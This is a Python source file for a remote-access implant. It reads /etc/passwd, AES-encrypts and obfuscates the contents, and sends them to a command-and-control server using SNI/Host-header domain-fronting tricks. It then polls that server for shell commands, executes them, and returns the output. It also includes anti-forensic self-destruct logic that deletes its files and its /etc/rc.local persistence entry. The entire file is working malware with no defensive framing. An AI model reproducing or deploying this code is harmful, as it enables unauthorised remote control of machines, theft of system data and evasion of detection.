#!/usr/bin/env python3
import time
import requests
import base64
import subprocess
import os
import sys
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import os
import base64
import hashlib

BLOCK_SIZE = 16
KEY = "your_secret_key_here"  # Replace with your actual key

# function that does AES encryption and then obfuscation
def do_everything(data):
    encrypted_data = aes_encrypt(data, KEY)
    obfuscated_data = obfuscate(encrypted_data)
    return obfuscated_data

# function that does AES decryption and then deobfuscation
def undo_everything(data):
    deobfuscated_data = deobfuscate(data)
    decrypted_data = aes_decrypt(deobfuscated_data, KEY)
    return decrypted_data


def aes_encrypt(plaintext, key):
    key_bytes = hashlib.sha256(key.encode()).digest()[:16]
    iv = os.urandom(BLOCK_SIZE)

    # PKCS7 padding
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(plaintext.encode()) + padder.finalize()

    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(padded_data) + encryptor.finalize()

    return base64.b64encode(iv + encrypted).decode()

def aes_decrypt(ciphertext_b64, key):
    key_bytes = hashlib.sha256(key.encode()).digest()[:16]
    raw = base64.b64decode(ciphertext_b64)
    iv = raw[:BLOCK_SIZE]
    encrypted = raw[BLOCK_SIZE:]

    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(padded_data) + unpadder.finalize()

    return plaintext.decode()

def obfuscate(text):
    """Obfuscate text by first base64‑encoding it, then splitting into 16‑character chunks,
    padding the last chunk with '@' if needed, and reversing the order of chunks."""
    b64_text = base64.b64encode(text.encode()).decode()
    chunk_size = 16
    chunks = [b64_text[i:i+chunk_size] for i in range(0, len(b64_text), chunk_size)]
    if chunks and len(chunks[-1]) < chunk_size:
        chunks[-1] = chunks[-1].ljust(chunk_size, '@')
    return ''.join(reversed(chunks))

def deobfuscate(obf_str):
    """Reverse the obfuscation: split into 16‑character chunks, reverse order,
    and remove trailing '@' from the final chunk."""
    chunk_size = 16
    chunks = [obf_str[i:i+chunk_size] for i in range(0, len(obf_str), chunk_size)]
    chunks = list(reversed(chunks))
    if chunks:
        chunks[-1] = chunks[-1].rstrip('@')
    ordered_chunks = ''.join(chunks)
    return base64.b64decode(ordered_chunks.encode()).decode()

# --- Domain Fronting Settings ---
FRONT_DOMAIN = "www.google.com"  # TLS SNI for obfuscation
FRONT_DOMAIN = "127.0.0.1:8080"
REAL_DOMAIN = "127.0.0.1:8080"         # Actual C2 server IP/domain
UPLOAD_PATH = "/upload"
COMMAND_PATH = "/command"
RESULT_PATH = "/result"

UPLOAD_URL = f"https://{FRONT_DOMAIN}{UPLOAD_PATH}"
COMMAND_URL = f"https://{FRONT_DOMAIN}{COMMAND_PATH}"
RESULT_URL = f"https://{FRONT_DOMAIN}{RESULT_PATH}"

class SNIAdapter(HTTPAdapter):
    def __init__(self, server_hostname, *args, **kwargs):
        self.server_hostname = server_hostname
        super().__init__(*args, **kwargs)
        
    def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
        pool_kwargs['server_hostname'] = self.server_hostname
        self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block, **pool_kwargs)

def self_destruct():
    print("Initiating self-destruct sequence...")
    try:
        # Remove log file if it exists.
        log_file = "/tmp/implant.log"
        if os.path.exists(log_file):
            os.remove(log_file)
        # Remove the implant file (self).
        implant_file = "/tmp/implant.py"
        if os.path.exists(implant_file):
            os.remove(implant_file)
        # Remove the implant's entry from /etc/rc.local.
        rc_local = "/etc/rc.local"
        if os.path.exists(rc_local):
            with open(rc_local, "r") as f:
                lines = f.readlines()
            with open(rc_local, "w") as f:
                for line in lines:
                    if "python3 /tmp/implant.py" not in line:
                        f.write(line)
        print("Self-destruct complete. Exiting.")
    except Exception as e:
        print("Error during self-destruct:", e)
    finally:
        sys.exit(0)

def send_data():
    try:
        with open("/etc/passwd", "r") as file:
            file_data = file.read()
        
        secret_data = do_everything(file_data)
        payload = {"data": secret_data}
        session = requests.Session()
        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
        session.mount("https://", adapter)
        headers = {"Host": REAL_DOMAIN}
        response = session.post(UPLOAD_URL, data=payload, headers=headers, verify=False)
        if response.status_code == 200:
            print("Data sent successfully")
            return True
        else:
            print("Failed to send data. Status code:", response.status_code)
            return False
    except Exception as e:
        print("Error exfiltrating data:", e)
        return False

def poll_command():
    try:
        session = requests.Session()
        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
        session.mount("https://", adapter)
        headers = {"Host": REAL_DOMAIN}
        response = session.get(COMMAND_URL, headers=headers, verify=False)
        print(response.request.url)
        if response.status_code == 200:
            json_data = response.json()
            obfuscated_cmd = json_data.get("data", "")
            if obfuscated_cmd:
                cmd = undo_everything(obfuscated_cmd)
                print("Received command:", cmd)
                return cmd
        else:
            print("Failed to poll command. Status:", response.status_code)
        return None
    except Exception as e:
        print("Error polling command:", e)
        return None

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()

def send_result(result):
    try:
        session = requests.Session()
        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
        session.mount("https://", adapter)
        headers = {"Host": REAL_DOMAIN}

        secret_result = do_everything(result)
        payload = {"data": secret_result}
        
        response = session.post(RESULT_URL, data=payload, headers=headers, verify=False)
        if response.status_code == 200:
            print("Result sent successfully")
        else:
            print("Failed to send result. Status:", response.status_code)
    except Exception as e:
        print("Error sending result:", e)

def main():
    fail_count = 0
    while True:
        if not send_data():
            fail_count += 1
        else:
            fail_count = 0

        if fail_count >= 60:
            self_destruct()

        cmd = poll_command()
        if cmd:
            if cmd.strip() == "BIG BANG!!":
                self_destruct()
            else:
                print("Executing command:", cmd)
                result = execute_command(cmd)
                print("Command output:", result)
                send_result(result)
        time.sleep(15)

if __name__ == '__main__':
    main()
